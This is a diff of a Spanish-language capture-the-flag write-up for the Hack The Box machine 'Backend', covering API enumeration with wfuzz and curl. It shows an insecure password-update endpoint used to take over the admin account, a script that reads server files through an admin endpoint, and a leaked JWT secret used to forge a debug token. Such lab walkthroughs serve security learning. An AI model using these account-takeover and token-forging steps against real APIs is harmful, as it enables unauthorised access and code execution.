@@ -1,5 +1,9 @@
 10.10.11.161 - Backend
+
+![Backend](https://user-images.githubusercontent.com/96772264/199570111-58bed0e6-4084-4bf5-aee8-5e6b44ee353e.png)
+
 ----------------------
+# Part 1: Enumeración
 
 Puertos abiertos: 22(ssh), 80(http)
 
@@ -10,7 +14,10 @@ http://10.10.11.161 [200 OK] Country[RESERVED][ZZ], HTTPServer[uvicorn], IP[10.1
 000000076:   307        0 L      0 W        0 Ch        "docs"
 000001012:   307        0 L      0 W        0 Ch        "api"
 ```
-Hay un subdirectorio /api
+Hay un subdirectorio **/api**:
+
+![backend1](https://user-images.githubusercontent.com/96772264/199570885-1ec8a845-06d5-4f73-93d2-1f1cd52b7d72.PNG)
+
 > Una api es una web diseñada para los programas en vez de para las persoanas, por eso no tiene interfaz grafica 
 > y funciona principalmente por intercambio de datos en formato json en rutas conocidas como **endpoints**
 
@@ -34,13 +41,16 @@ null
 ...
 ```
 
-La ruta /docs nos devuelve "not authenticated"
-Lo unico que queda es cambiar el metodo.
+La ruta /docs nos devuelve "not authenticated" Lo unico que queda es cambiar el metodo.
 ```console
 └─$ wfuzz -c --hc=405 -t 200 -X POST -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.161/api/v1/user/FUZZ
 000000039:   422        0 L      3 W        172 Ch      "login"                                              
 000000203:   422        0 L      2 W        81 Ch       "signup"   
+```
+----------------------
+# Part 2: Creando un usaurio
 
+```console
 └─$ curl -s -X POST http://10.10.11.161/api/v1/user/login -d {'loc':'test'} | jq
 { "detail": [
      {"loc": [
@@ -72,6 +82,8 @@ Como nos da error porque faltan dos campos que si se están enviando, habra que 
 Nos da un token que habrá que arrastrar todo el rato del lado de la autenticacion, asi que mejor hacerse un script
 Si lo decodificamos en jwt.io es muy similar a lo que obtuvimos de admin solo que "is_superuser : false"
 
+![backend2](https://user-images.githubusercontent.com/96772264/199570959-f9d81261-362c-4b8d-be93-f9e649e24d16.PNG)
+
 ```bash
 #!/usr/bin/bash
 bearer=$(curl -s -X POST http://10.10.11.161/api/v1/user/login -d "username=cucuxii@htb.local&password=cucucxii123" | jq | grep -oP '".*?"' | awk 'NR==2' | tr -d '"')
@@ -85,12 +97,11 @@ La ruta /docs ```http://10.10.11.161/docs/``` no devuelve nada y si le ponemos -
 poniendo -L para seguirlo no hay suerte.
 
 Si lo abrimos por el navegador, pero añadiendo la cabecera de Authorization: bearer ... con este 
-[plugin](https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/) podemos acceder a una web js
-con todos los endpoints.
+[plugin](https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/) podemos acceder a una web js con todos los endpoints.
+![backend4](https://user-images.githubusercontent.com/96772264/199571009-fe7abf5f-7263-4050-a430-7b8f35ce356b.PNG)
+![backend5](https://user-images.githubusercontent.com/96772264/199571067-a2bf4431-fba6-48a9-822f-130db1731ae2.PNG)
 
-
-Por ejemplo sale este nuevo /api/v1/user/SecretFlagEndpoint (se puede ejecutar tanto desde la web como desde
-curl)
+Por ejemplo sale este nuevo /api/v1/user/SecretFlagEndpoint (se puede ejecutar tanto desde la web como desde curl)
 
 ```console
 └─$ curl -X 'PUT' \
@@ -99,14 +110,14 @@ curl)
   -H 'Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6Ik...
 {"user.txt":"e66d6585b7ae1f526bf27e341f0d880c"}  
 ```
-Tambien hay dos nuevos endpoints del admin, uno para leer archivos de la máquina y otro para ejecutar comandos
-en ella, pero no podemos por no ser admin.
+Tambien hay dos nuevos endpoints del admin, uno para leer archivos de la máquina y otro para ejecutar comandos en ella, pero no podemos por no ser admin.
+El endpoint /docs (o sea donde estamos) tira de openapi.json, de ahí saca la información la web actual (y nos muestra como funcionan todos los endpoints)
 
-El endpoint /docs (o sea donde estamos) tira de openapi.json, de ahí saca la información la web actual (y nos
-muestra como funcionan todos los endpoints)
+----------------------
+# Part 3: Accediendo al usuario admin
 
-Uno de los endpoints más criticos es es de /api/v1/user/updatepass. Nos pide guid y password, el guid es el 
-identificado de usuario y la contraseña, la nueva que cambiarle.
+Uno de los endpoints más criticos es es de /api/v1/user/updatepass. Nos pide guid y password, el guid es el identificado de usuario y la contraseña, la nueva que
+cambiarle.
 
 Se supone que está para ponerle tu guid, pero se le podría poner otro.
 ```console
@@ -114,6 +125,8 @@ Se supone que está para ponerle tu guid, pero se le podría poner otro.
 └─$ curl -s http://10.10.11.161/api/v1/user/1
 {"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","email":"admin@htb.local","date":null,"time_created":1649533388111,"is_superuser":true,"id":1} 
 ```
+![backend6](https://user-images.githubusercontent.com/96772264/199571197-10b2a53a-6cd4-4de7-a516-c6d3b7c708f8.PNG)
+
 En el endpoint nos muestran el comando por curl:
 ```console
 curl -X POST 'http://10.10.11.161/api/v1/user/updatepass' \
@@ -139,10 +152,8 @@ curl -X GET 'http://10.10.11.161/api/v1/admin/exec/whoami' \
 ```
 
 Y el de leer archivos -> **/api/v1/admin/file**, este es mejor scriptearselo para tardar menos
-
 ```bash
 #!/bin/bash
-
 bearer="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MTE0MjgzLCJpYXQiOjE2Njc0MjMwODMsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.Ghu7tUuWPi58GvtcdvQnkHc0jZK32VzN1LxrkfKkSgA"
 
 while true
@@ -175,6 +186,9 @@ $:> /home/htb/uhc/app/core/config.py
 JWT_SECRET: str = \"SuperSecretSigningKey-HTB\" # -> la key
 FIRST_SUPERUSER: EmailStr = \"root@ippsec.rocks\" # -> lolazo
 ```
+----------------------
+# Part 4: Consiguiendo ejecución de comandos
+
 Vamos a crear nustra jwt otra vez pero con este parametro "Debug"
 ```python
 >>> import jwt
@@ -187,7 +201,7 @@ Vamos a crear nustra jwt otra vez pero con este parametro "Debug"
 >>> jwt.encode(cookie, secret, "HS256")
 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MTE0MjgzLCJpYXQiOjE2Njc0MjMwODMsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.iZFvYEBJbK9PX4xl1SfdfUwowHOoD34pMHozKr4wUeA'
 ```
-
+Ya tenemos dicho token valido, asi que podemos utilizar este comando.
 ```bash
 #!/bin/bash
 
